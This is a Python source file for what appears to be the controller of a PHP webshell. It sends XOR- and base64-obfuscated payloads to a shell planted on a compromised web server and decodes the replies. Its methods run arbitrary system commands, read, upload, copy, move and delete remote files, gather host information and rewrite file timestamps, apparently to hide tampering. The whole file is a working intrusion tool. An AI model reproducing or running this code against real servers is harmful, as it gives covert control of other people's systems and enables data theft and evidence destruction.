import base64
import hashlib
import json
import requests
from Conf import Conf
from CommonConf import CommonConf

class PHPCommon:
    def __init__(self,header=''):
        self.headers = Conf.HEADERS
        # print(header)
        if header != '':
            key, value = header.split(":", 1)
            self.headers[key] = value.lstrip()
        self.timeout = Conf.TIMEOUT
        self.payload_path = Conf.PHP_PAYLOAD_FILEPATH


    # encrypt
    def xor_encode(self, payload, key) -> str:
        # print(payload)
        # print(key)
        # 创建一个字符列表以存储编码的结果
        key = hashlib.md5(key.encode()).hexdigest()[:16]
        result = list(payload)

        # 遍历每个字符
        for i in range(len(payload)):
            c = key[(i + 1) & 15]  # 获取 K 中的字符
            result[i] = chr(ord(payload[i]) ^ ord(c))  # 使用异或操作并转换为字符

        return ''.join(result)  # 将字符列表合并为字符串
    
    def read_init_payload(self,filename):
        with open(filename,"r") as fr:
            payload = fr.read()
        return payload
    
    def set_payload(self,payload,key) -> str:
        # payload = ''
        payload = self.xor_encode(payload,key).encode()
        payload = base64.b64encode(payload).decode()

        return payload
    
    def send_payload(self,url,password,payload):
        data = {password:payload}
        r=requests.post(url=url,headers=self.headers,data=data,verify=False,timeout=self.timeout)
        # print(r.text)
        return r.text

    def get_payload_result(self,encryptResult:str,key):
        result = self.xor_encode(base64.b64decode(encryptResult.encode()).decode(),key)
        return result
    
    def getbasicinfo(self,url,password,key):
        filepath = self.payload_path+'getBasicInfo.php'
        payload = self.read_init_payload(filepath)
        payload = self.set_payload(payload,key)
        # print(payload)
        data = self.get_payload_result(self.send_payload(url,password,payload),key)
        # print(data)
        return data
    
    def get_files_attr(self,url,password,key,dirName):
        filepath = self.payload_path+'getFileAtt.php'
        payload = self.read_init_payload(filepath)
        payload = payload.replace('{{dirName}}',dirName.rstrip('\\'))
        payload = self.set_payload(payload,key)
        data = self.get_payload_result(self.send_payload(url,password,payload),key)
        data = json.loads(data)
        # print(data)
        data = CommonConf().format_result_php_getFileAtt(data)
        return data
    
    def set_file_time(self,url,password,key,filename,newtime):
        filepath = self.payload_path+'setFileTime.php'
        payload = self.read_init_payload(filepath)
        payload = payload.replace('{{filename}}',filename).replace('{{newMtime}}',newtime).replace('{{newAtime}}',newtime)
        payload = self.set_payload(payload,key)
        # print(payload)
        data = self.get_payload_result(self.send_payload(url,password,payload),key)
        return data

    def cat_file(self,url,password,key,filePath):
        filepath = self.payload_path+'catFile.php'
        payload = self.read_init_payload(filepath)
        payload = payload.replace('{{filePath}}',filePath).replace('{{filePath}}',filePath)
        payload = self.set_payload(payload,key)
        # print(payload)
        data = self.get_payload_result(self.send_payload(url,password,payload),key)
        data = base64.b64decode(data.encode()).decode()
        return data

    def copy_file(self,url,password,key,srcFileName,destFileName):
        filepath = self.payload_path+'copyFile.php'
        payload = self.read_init_payload(filepath)
        payload = payload.replace('{{srcFileName}}',srcFileName).replace('{{destFileName}}',destFileName)
        payload = self.set_payload(payload,key)
        # print(payload)
        data = self.get_payload_result(self.send_payload(url,password,payload),key)
        return data

    def move_file(self,url,password,key,srcFileName,destFileName):
        filepath = self.payload_path+'moveFile.php'
        payload = self.read_init_payload(filepath)
        payload = payload.replace('{{srcFileName}}',srcFileName).replace('{{destFileName}}',destFileName)
        payload = self.set_payload(payload,key)
        # print(payload)
        data = self.get_payload_result(self.send_payload(url,password,payload),key)
        return data

    def upload_file(self,url,password,key,localfile,remotefile):
        filepath = self.payload_path+'uploadFile.php'
        with open(localfile,"r",encoding='utf-8') as fr:
            fileContent = fr.read()
        base64fileContent = base64.b64encode(fileContent.encode('utf-8')).decode('utf-8')
        payload = self.read_init_payload(filepath)
        payload = payload.replace('{{filePath}}',remotefile).replace('{{fileContents}}',base64fileContent)
        payload = self.set_payload(payload,key)
        data = self.get_payload_result(self.send_payload(url,password,payload),key)
        return data

    def delete_file(self,url,password,key,filePath):
        filepath = self.payload_path+'deleteFile.php'
        payload = self.read_init_payload(filepath)
        payload = payload.replace('{{filePath}}',filePath)
        payload = self.set_payload(payload,key)
        data = self.get_payload_result(self.send_payload(url,password,payload),key)
        return data

    def execCommand(self,url,password,key,cmdLine):
        cmdLine = ' '.join(cmdLine)
        filepath = self.payload_path+'execCommand.php'
        payload = self.read_init_payload(filepath)
        payload = payload.replace('{{cmdLine}}',cmdLine)
        payload = self.set_payload(payload,key)
        data = self.get_payload_result(self.send_payload(url,password,payload),key)
        data = base64.b64decode(data.encode()).decode()
        return data